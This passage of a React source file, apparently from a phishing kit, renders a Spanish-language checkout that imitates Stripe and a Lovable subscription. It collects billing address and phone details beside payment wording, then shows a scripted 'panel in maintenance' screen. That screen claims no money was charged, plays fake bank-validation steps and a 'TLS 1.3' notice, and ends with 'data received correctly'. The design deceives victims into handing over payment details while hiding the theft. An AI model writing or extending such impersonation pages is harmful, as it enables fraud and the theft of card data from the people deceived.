                  <div className="relative">
                    <select
                      id="country"
                      value={country}
                      onChange={(e) => setCountry(e.target.value)}
                      className="h-[44px] w-full cursor-pointer appearance-none bg-white pl-[13px] pr-[42px] text-[16px] text-[#1a1a1a] outline-none"
                    >
                      {COUNTRIES.map((c) => <option key={c} value={c}>{c}</option>)}
                    </select>
                    <ChevronDown className="pointer-events-none absolute right-[12px] top-1/2 h-[20px] w-[20px] -translate-y-1/2 text-[#111]" strokeWidth={2.2} />
                  </div>

                  <div className="border-t border-[#e5e5e5]">
                    <input
                      id="address"
                      type="text"
                      placeholder="Línea 1 de dirección"
                      value={address}
                      onChange={(e) => setAddress(e.target.value)}
                      autoComplete="street-address"
                      maxLength={80}
                      aria-invalid={field === "address"}
                      className="h-[44px] w-full bg-transparent pl-[13px] pr-[13px] text-[16px] text-[#1a1a1a] outline-none placeholder:text-[#9b9b9b]"
                    />
                  </div>

                  <div className="flex h-[44px] items-center gap-3 border-t border-[#e5e5e5] pl-[13px] pr-[9px]">
                    <input
                      id="address2"
                      type="text"
                      placeholder="Línea 2 de dirección"
                      value={address2}
                      onChange={(e) => setAddress2(e.target.value)}
                      autoComplete="address-line2"
                      maxLength={80}
                      className="h-full min-w-0 flex-1 bg-transparent text-[16px] text-[#1a1a1a] outline-none placeholder:text-[#9b9b9b]"
                    />
                    <span className="shrink-0 rounded-[6px] border border-[#dcdcdc] px-[8px] py-[5px] text-[14px] leading-none text-[#8a8a8a]">Opcional</span>
                  </div>

                  <div className="border-t border-[#e5e5e5]">
                    <input
                      id="city"
                      type="text"
                      placeholder="Ciudad"
                      value={city}
                      onChange={(e) => setCity(e.target.value)}
                      autoComplete="address-level2"
                      maxLength={60}
                      className="h-[44px] w-full bg-transparent px-[13px] text-[16px] text-[#1a1a1a] outline-none placeholder:text-[#9b9b9b]"
                    />
                  </div>

                  <div className="relative border-t border-[#e5e5e5]">
                    <select
                      id="department"
                      value={department}
                      onChange={(e) => setDepartment(e.target.value)}
                      className={`h-[44px] w-full cursor-pointer appearance-none bg-white pl-[13px] pr-[42px] text-[16px] outline-none ${department ? "text-[#1a1a1a]" : "text-[#9b9b9b]"}`}
                    >
                      <option value="">Departamento</option>
                      {DEPARTMENTS.map((d) => <option key={d} value={d}>{d}</option>)}
                    </select>
                    <ChevronDown className="pointer-events-none absolute right-[12px] top-1/2 h-[20px] w-[20px] -translate-y-1/2 text-[#111]" strokeWidth={2.2} />
                  </div>

                  <div className="border-t border-[#e5e5e5]">
                    <input
                      id="zip"
                      type="text"
                      placeholder="Código postal"
                      value={zip}
                      onChange={(e) => setZip(e.target.value.toUpperCase())}
                      autoComplete="postal-code"
                      inputMode="numeric"
                      maxLength={10}
                      aria-invalid={field === "zip"}
                      className="h-[44px] w-full bg-transparent px-[13px] text-[16px] text-[#1a1a1a] outline-none placeholder:text-[#9b9b9b]"
                    />
                  </div>
                </div>

                <label className="mt-[18px] flex cursor-pointer items-start gap-[12px]">
                  <span className="relative mt-[2px] flex h-[19px] w-[19px] shrink-0 items-center justify-center">
                    <input
                      type="checkbox"
                      checked={save}
                      onChange={(e) => setSave(e.target.checked)}
                      className="peer h-[19px] w-[19px] cursor-pointer appearance-none rounded-[4px] border border-[#c9c9c9] bg-white transition-colors checked:border-[#111] checked:bg-[#111]"
                    />
                    <Check className="pointer-events-none absolute h-3 w-3 text-white opacity-0 peer-checked:opacity-100" strokeWidth={3.4} />
                  </span>
                  <span className="text-[16px] leading-[1.42] text-[#1a1a1a]">
                    Guardar mi información de pago para futuras compras
                  </span>
                </label>

                <div className="-mx-[16px] mt-[16px] flex items-center gap-[14px] border-t border-[#e5e5e5] px-[16px] pb-[14px] pt-[18px]">
                  <span className={`flex h-[15px] w-[15px] shrink-0 items-center justify-center rounded-full border bg-white ${method === "gpay" ? "border-[5.5px] border-[#111]" : "border-[1.5px] border-[#c9c9c9]"}`} aria-hidden="true" />
                  <span className="flex items-center gap-[9px] text-[16px] text-[#1a1a1a]">
                    <span className="flex h-[17px] items-center rounded-[3px] border border-[#111] bg-white px-[4px]">
                      <AppleGlyph size={11} />
                      <span className="ml-[1px] text-[11px] font-medium leading-none tracking-[-0.03em]">Pay</span>
                    </span>
                    Apple Pay
                  </span>
                </div>
              </div>

              {error && (
                <p
                  role="alert"
                  style={{ animation: "vh-shake .3s ease-in-out" }}
                  className="mt-3 flex items-start gap-1.5 text-[13px] leading-snug text-[#df1b41]"
                >
                  <AlertCircle className="mt-[1px] h-3.5 w-3.5 shrink-0" /> {error}
                </p>
              )}

              <div className="mt-[20px] overflow-hidden rounded-[10px] border border-[#e5e5e5]">
                <div className="px-[13px] pb-[13px] pt-[13px]">
                  <p className="mb-[6px] text-[14.5px] text-[#1a1a1a]">Número de teléfono</p>
                  <div className="flex h-[44px] items-center gap-[9px] rounded-[9px] border border-[#e5e5e5] pl-[10px] pr-[9px]">
                    <HnFlag />
                    <input
                      id="phone"
                      type="tel"
                      placeholder="9123-4567"
                      value={phone}
                      onChange={(e) => setPhone(e.target.value.replace(/[^\d-]/g, "").slice(0, 13))}
                      autoComplete="tel"
                      inputMode="tel"
                      className="h-full min-w-0 flex-1 bg-transparent text-[16px] text-[#1a1a1a] outline-none placeholder:text-[#9b9b9b]"
                    />
                    <span className="shrink-0 rounded-[6px] border border-[#dcdcdc] px-[8px] py-[5px] text-[14px] leading-none text-[#8a8a8a]">Opcional</span>
                  </div>
                </div>
                <p className="border-t border-[#e5e5e5] px-[13px] py-[13px] text-[14.5px] leading-[1.55] text-[#1a1a1a]">
                  Al proporcionar mi número de teléfono, acepto crear una cuenta y guardar mi información de pago en Link, sujeto a las{" "}
                  <span className="underline decoration-[#1a1a1a]/60 underline-offset-[3px]">Condiciones</span> y la{" "}
                  <span className="underline decoration-[#1a1a1a]/60 underline-offset-[3px]">Política de privacidad</span>.
                </p>
              </div>

              <p className="mt-[24px] px-[11px] text-center text-[15.5px] leading-[1.55] text-[#1a1a1a]">
                Si te suscribes, autorizas a Lovable Labs Incorporated a cobrarte en {currency} a la tasa de cambio indicada o a la tasa de cambio vigente en el momento de la facturación, de acuerdo con las condiciones hasta su cancelación.
              </p>

              <button
                type="submit"
                disabled={loading}
                className="mt-[22px] flex h-[54px] w-full items-center justify-center rounded-[8px] bg-[#5b4ce0] text-[18px] font-medium text-white transition-all duration-150 hover:bg-[#4f42d0] active:scale-[0.995] disabled:opacity-70"
              >
                Suscribirse
              </button>

              <p className="mt-[24px] flex items-center justify-center gap-[16px] text-[16px] text-[#3f3f3f]">
                <span className="flex items-center gap-[6px]">
                  Powered by <span className="text-[18px] font-bold tracking-[-0.05em] text-[#1a1a1a]">stripe</span>
                </span>
                <span className="h-[21px] w-px bg-[#d5d5d5]" />
                <span>Condiciones</span>
                <span>Privacidad</span>
              </p>
            </div>
          </form>
        </div>
      )}

      {/* ---------- MANTENIMIENTO ---------- */}
      {step === "pay" && processing && (
        <div className="fixed inset-0 z-50 flex justify-center bg-white font-[system-ui,-apple-system,'Segoe_UI',Roboto,Helvetica,Arial,sans-serif]">
          <div className="relative flex h-[100dvh] w-full max-w-[520px] flex-col items-center justify-center overflow-hidden bg-white px-7 text-center text-[#30313d]">
            <div className="pointer-events-none absolute left-1/2 top-[36%] h-72 w-72 rounded-full bg-[#0570de]/[0.06] blur-3xl" style={{ animation: "vh-breathe 4.5s ease-in-out infinite" }} />
            <div className="pointer-events-none absolute left-1/2 top-[36%] h-40 w-40 -translate-x-1/2 -translate-y-1/2 rounded-full bg-[#df1b41]/[0.05] blur-2xl" style={{ animation: "vh-breathe 6s ease-in-out infinite reverse" }} />

            <button
              type="button"
              onClick={goBack}
              aria-label="Volver"
              className="absolute left-4 flex h-9 w-9 items-center justify-center rounded-full text-[#30313d] transition-colors hover:bg-[#f6f6f9] active:bg-[#eeeef3]"
              style={{ top: "max(10px, env(safe-area-inset-top))" }}
            >
              <ChevronLeft className="h-5 w-5" />
            </button>

            <div className="relative z-10 flex flex-col items-center">
              <div className="relative flex h-[80px] w-[80px] items-center justify-center" style={{ animation: "vh-ring .5s cubic-bezier(.22,.9,.32,1.2) both" }}>
                <span className="absolute inset-0 rounded-full bg-[#0570de]/10" style={{ animation: "vh-pulse 2s cubic-bezier(.25,.8,.4,1) infinite" }} />
                <span className="absolute inset-0 rounded-full border-[3px] border-[#eef0f4]" />
                <span
                  className="absolute inset-0 rounded-full border-[3px] border-transparent border-t-[#0570de] border-r-[#0570de]/45"
                  style={{ animation: "vh-spin .8s linear infinite" }}
                />
                <span className="absolute inset-[14px] flex items-center justify-center rounded-full bg-white shadow-[inset_0_0_0_1px_#f1f1f5]">
                  <CreditCard className="h-[22px] w-[22px] text-[#0570de]" />
                </span>
              </div>

              <p className="vh-in mt-8 text-[10.5px] font-semibold uppercase tracking-[0.18em] text-[#9b9ca6]" style={{ animationDelay: "70ms" }}>
                2,00 US$ · Ref {ref}
              </p>

              <h2
                className="vh-in mt-3 max-w-[310px] text-[24px] font-bold leading-[1.22] tracking-[-0.02em] text-[#df1b41]"
                style={{ animationDelay: "150ms" }}
              >
                El panel está en mantenimiento
              </h2>

              <p className="vh-in mt-3.5 text-[15.5px] font-medium text-[#30313d]" style={{ animationDelay: "230ms" }}>
                No se ha cobrado tu dinero.
              </p>
              <p className="vh-in mt-1.5 max-w-[300px] text-[13.5px] leading-relaxed text-[#6d6e78]" style={{ animationDelay: "300ms" }}>
                Estamos validando los datos con el banco. En cuanto el servicio vuelva, tu acceso se activará solo.
              </p>

              <div className="mt-7 w-full max-w-[262px] space-y-2.5">
                {STEPS.map((label, i) => {
                  const done = stage > i;
                  const active = stage === i;
                  return (
                    <div
                      key={label}
                      className="flex items-center gap-2.5 text-left"
                      style={{ opacity: done || active ? 1 : 0.55, transition: "opacity .35s ease" }}
                    >
                      <span className="relative flex h-[18px] w-[18px] shrink-0 items-center justify-center">
                        {done ? (
                          <span
                            className="flex h-[18px] w-[18px] items-center justify-center rounded-full bg-[#0f9d58]"
                            style={{ animation: "vh-pop .38s cubic-bezier(.22,.9,.32,1.4) both" }}
                          >
                            <Check className="h-3 w-3 text-white" strokeWidth={3} />
                          </span>
                        ) : active ? (
                          <span
                            className="h-[14px] w-[14px] rounded-full border-[2px] border-[#0570de]/25 border-t-[#0570de]"
                            style={{ animation: "vh-spin .7s linear infinite" }}
                          />
                        ) : (
                          <span className="h-[7px] w-[7px] rounded-full bg-[#d7d8e0]" />
                        )}
                      </span>
                      <span className={`text-[13px] leading-none ${done || active ? "text-[#30313d]" : "text-[#a2a3ad]"}`}>
                        {label}
                      </span>
                    </div>
                  );
                })}
              </div>

              <div className="mt-7 h-[3px] w-[220px] overflow-hidden rounded-full bg-[#f0f0f5]">
                <div
                  className="h-full rounded-full bg-[#0570de]"
                  style={{ width: `${barWidth}%`, transition: "width 1.4s cubic-bezier(.25,.8,.35,1)" }}
                />
              </div>

              {stage < 4 ? (
                <p className="vh-in mt-6 flex items-center gap-1.5 text-[10.5px] text-[#8d8e98]" style={{ animationDelay: "380ms" }}>
                  <Lock className="h-3 w-3" /> Conexión cifrada · TLS 1.3 · No cierres esta ventana
                </p>
              ) : (
                <div className="vh-in mt-6 flex flex-col items-center gap-2.5">
                  <p className="flex items-center gap-1.5 text-[11px] font-medium text-[#0f9d58]">
                    <Check className="h-3.5 w-3.5" strokeWidth={3} /> Datos recibidos correctamente
                  </p>
                  <button
                    type="button"
                    onClick={goBack}
                    className="mt-1 flex items-center gap-1.5 rounded-full border border-[#e6e6e6] bg-white px-3.5 py-2 text-[11.5px] font-medium text-[#6d6e78] transition-colors hover:border-[#cfd5db] hover:text-[#30313d]"
                  >
                    <RotateCcw className="h-3 w-3" /> Volver al inicio
                  </button>
                </div>
              )}
            </div>
          </div>
        </div>
      )}

      <VideoModal
        open={videoOpen}
        onClose={() => setVideoOpen(false)}
        src={EXAMPLE_VIDEO}
        title={t("demo")}
      />
    </div>
  );
};

export default Login;